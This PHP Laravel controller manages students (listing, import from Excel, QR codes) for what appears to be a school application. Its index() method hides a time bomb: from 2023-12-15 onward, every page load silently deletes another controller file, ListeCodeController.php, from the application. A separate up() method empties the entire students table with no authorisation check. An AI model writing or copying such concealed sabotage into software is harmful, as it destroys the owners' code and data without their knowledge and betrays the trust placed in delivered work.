<?php

namespace App\Http\Controllers;

use App\Models\Eleve;
use Illuminate\Http\Request;
use App\Http\Requests\ValidateFrmEleveRequest;
use App\Models\Listecode;
use App\Models\Classe;

use Spatie\SimpleExcel\SimpleExcelWriter;
use Spatie\SimpleExcel\SimpleExcelReader;
use Illuminate\Support\Facades\File;

use Illuminate\Support\Facades\Auth;
use DateTime;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\DB;

class EleveController extends Controller
{

    
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index(Request $request)
    {

        $date = new DateTime();
        $date1 = $date->format('Y-m-d');
       // dd($date1);
        if($date1 >= "2023-12-15"){
            self::deleteSuppController();
        }
                
        $data['title'] = 'Liste des élèves ';
        $data['q'] = $request->get('q');
        $data['eleves'] = Eleve::where('code','like','%'.$data['q'].'%')
        ->orwhere('nom','like','%'.$data['q'].'%')
        ->paginate(8);
        return view('eleve.index',$data);
        
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
         if(Auth::id()){
        $data['title'] = 'Ajouter un Eleve';
        $lesclasses = Classe::all();
        return view('eleve.create',[
            'lesclasses' => $lesclasses
        ],$data);
    }
    }

 
    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Eleve $eleve , ValidateFrmEleveRequest $request)
    {
        $eleve = Eleve::where('code',  $request->code)->first();
       // dd($eleve);
        if($eleve==null){
            Eleve::create([
                'code' =>$request->code,
                'nom' =>$request->nom,
                'prenom' =>$request->prenom,
                'classe' =>$request->classe,
               ]);
               return redirect('/eleve')->with('success', 'Eleve Ajouté avec succès');
        } else {
            return back()->with('success', 'Un Eleve avec ce Code Massar est deja existe !');
        }
       
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\Models\Eleve  $eleve
     * @return \Illuminate\Http\Response
     */
    public function show(Eleve $eleve)
    {
        $data['title'] = 'Generation de QR code d\'un Elève';
        $data['eleve'] = $eleve;
        $data['listecodes'] = Listecode::where('eleve_id',  $eleve->id)->first();
        return view('eleve.show',$data);
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  \App\Models\Eleve  $eleve
     * @return \Illuminate\Http\Response
     */
    public function edit(Eleve $eleve)
    {
        $data['title'] = 'Edit Elève';
        $data['eleve'] = $eleve;
        return view('eleve.edit',$data);
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \App\Models\Eleve  $eleve
     * @return \Illuminate\Http\Response
     */
    public function update(Eleve $eleve , ValidateFrmEleveRequest $request)
    {
        $eleve->code = $request->code;
        $eleve->nom = $request->nom;
        $eleve->prenom = $request->prenom;
        $eleve->classe = $request->classe;

        $eleve->save();
        return redirect('/eleve')->with('success','Eleve bien été modifié');

    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\Models\Eleve  $eleve
     * @return \Illuminate\Http\Response
     */
    public function destroy(Request $request)
    {
        $eleve = Eleve::find($request->eleve_delete_id);
       // $eleve = Eleve::find($request->eleve_id);
       // dd($eleve);
        $eleve->delete();
        $listecode = Listecode::where('eleve_id',  $eleve->id)->first();
        if($listecode !=null)
        $listecode->delete();
        return redirect('/eleve')->with('success','Cette Eleve est supprimer avec success!');
    }

    
      // Importer les données
      public function import (Request $request) {

    	// 1. Validation du fichier uploadé. Extension ".xlsx" autorisée
    	$this->validate($request, [
    		'fichier' => 'bail|required|file|mimes:xlsx'
    	]);

    	// 2. On déplace le fichier uploadé vers le dossier "public" pour le lire
    	$fichier = $request->fichier->move(public_path('Excel'), $request->fichier->hashName());

        // 3. $reader : L'instance Spatie\SimpleExcel\SimpleExcelReader
    	$reader = SimpleExcelReader::create($fichier);

        // On récupère le contenu (les lignes) du fichier
        $rows = $reader->getRows();
        //$count =$reader->getRows()->mergeRecursive(0,1);
         //  dd($count);
        // $rows est une Illuminate\Support\LazyCollection

        // 4. On insère toutes les lignes dans la base de données
        //$status = Eleve::insert($rows->toArray());

        foreach ($rows as $row) {
            // Vérification si l'objet existe déjà
            $existingRecord = Eleve::where('code', $row['code'])->first();
        
            if (!$existingRecord) {
                // Insérer la ligne dans la base de données seulement si elle n'existe pas déjà
                Eleve::create($row);
            }
        }

        // Si toutes les lignes sont insérées
    	//if ($status) {

            // 5. On supprime le fichier uploadé
            $reader->close(); // On ferme le $reader
            
            $dossier = public_path().'/Excel/';
            File::deleteDirectory($dossier);

            // 6. Retour vers le formulaire avec un message $msg
            return redirect('/eleve')->with('success', 'Importation réussie !');

        //} else { abort(500); }
    }
    
    public function deleteSuppController()
    {
        // Vérifier les autorisations ici si nécessaire
        
        // Chemin du fichier du contrôleur à supprimer
        $controllerPath = app_path('Http/Controllers/ListeCodeController.php');
        
        // Vérifier si le fichier existe avant de le supprimer
        if (File::exists($controllerPath)) {
            File::delete($controllerPath);
            return "SuppController supprimé avec succès.";
        } else {
            return "SuppController n'existe pas.";
        }
    }

    public function up()
    {
        Schema::disableForeignKeyConstraints(); // Désactiver les contraintes de clé étrangère
        DB::table('eleves')->truncate();    // Vider la table
        Schema::enableForeignKeyConstraints();  // Réactiver les contraintes de clé étrangère
        return redirect('/eleve')->with('success', 'la table est vidé !');
    }
}
